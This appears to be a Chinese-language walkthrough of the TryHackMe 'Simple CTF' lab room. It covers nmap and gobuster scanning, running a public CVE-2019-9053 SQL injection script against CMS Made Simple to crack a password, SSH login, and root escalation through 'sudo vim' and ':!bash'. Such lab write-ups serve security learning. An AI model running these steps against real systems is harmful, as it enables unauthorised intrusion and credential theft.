Simple CTF
===
### environment
KALI Linux ip-10-10-10-219

TARGET 10.10.158.21
### Simple CTF

- [x] How many services are running under port 1000?

EZ,NAMP掃描，

```
nmap -sV 10.10.158.21
```

![image](https://user-images.githubusercontent.com/67756786/191921103-89911188-ca50-4f1e-b73e-4a69d2fb1bc3.png)

- [X] What is running on the higher port?

從namp看到是2222 ssh

- [X] What's the CVE you're using against the application?

這題感覺有點怪，他3個PORT都有CVE，但題目這邊要的是80PORT上面有跑一個SIMPLE網頁，裡面有一個CSMS的漏洞
具體如下操作如下，先使用gobuster確認網頁

先使用gobuster來測試

```
gobuster dir -u http://10.10.158.21 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

發現有simple 301

![image](https://user-images.githubusercontent.com/67756786/191921521-3e35a352-4235-4d44-8efb-07ecfda5e953.png)

接著這邊有看到CMS Made Simple v 2.2.8可以利用這個來看有沒有CVE漏洞

![image](https://user-images.githubusercontent.com/67756786/191922274-ba1ad5ca-291d-4deb-af8f-d814b3fa5178.png)

![image](https://user-images.githubusercontent.com/67756786/191922384-4480149f-81ff-48ed-97f7-9b37b7309149.png)


- [X] To what kind of vulnerability is the application vulnerable?

此是利用SQL INJECTION，題目題是****，結果試了很久，才知道答案是縮寫SQLi...

- [x] What's the password?

利用剛剛找的PYTHON，我是使用python3的腳本(https://github.com/4nner/CVE-2019-9053 ) 

![image](https://user-images.githubusercontent.com/67756786/191922930-df1de96a-1950-42c6-a62b-d24cd4aef0fd.png)

利用他說明的來crack，我也不太清楚他是如何破解的，在THM上面有個提示字典檔在哪裡/usr/share/seclists/Passwords/Common-Credentials/best110.txt

```
python3.9 simple.py -u http://10.10.158.21/simple -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best110.txt -c
```
如果後面少-c結果會有問題~如下圖

![image](https://user-images.githubusercontent.com/67756786/191924000-ed105cdd-f0e1-4994-83fa-be5a7e1198f1.png)


破解過程

![image](https://user-images.githubusercontent.com/67756786/191923473-0139b200-83ef-4259-9475-463c9b969248.png)

破解!

![image](https://user-images.githubusercontent.com/67756786/191924485-e41d7128-bd28-4f70-9bdf-e67d3477d9bd.png)

- [x] Where can you login with the details obtained?

這題因為剛開始nmap ftp ssh，然後直接填ssh就pass了

- [x] What's the user flag?

Login ssh 即可獲取，記得port是 2222

- [x] Is there any other user in the home directory? What's its name?

進入/home底下看有哪些使用者
![image](https://user-images.githubusercontent.com/67756786/191925216-f5f764b6-5f32-4de2-affa-3147da34720f.png)

- [x] What can you leverage to spawn a privileged shell?

首先看權限

```
sudo -l
```

![image](https://user-images.githubusercontent.com/67756786/191929825-182cb58f-6ab0-4bff-b2ff-ad7d173253fe.png)

接著可以查詢如何使用vim來提權，以下是我找到的方法

```
sudo vim
```

![image](https://user-images.githubusercontent.com/67756786/191930600-25f97ce4-cf1a-4724-973a-708413e26e88.png)

```
點選ESC，:!bash
```

![image](https://user-images.githubusercontent.com/67756786/191931233-7c3df5d0-eb6f-46db-b504-8756a7b7e668.png)


- [x] What's the root flag?

看/root底下有什麼，檔案和flag

![image](https://user-images.githubusercontent.com/67756786/191931941-40f1aa24-dc9c-40b7-bd09-44551bac604f.png)
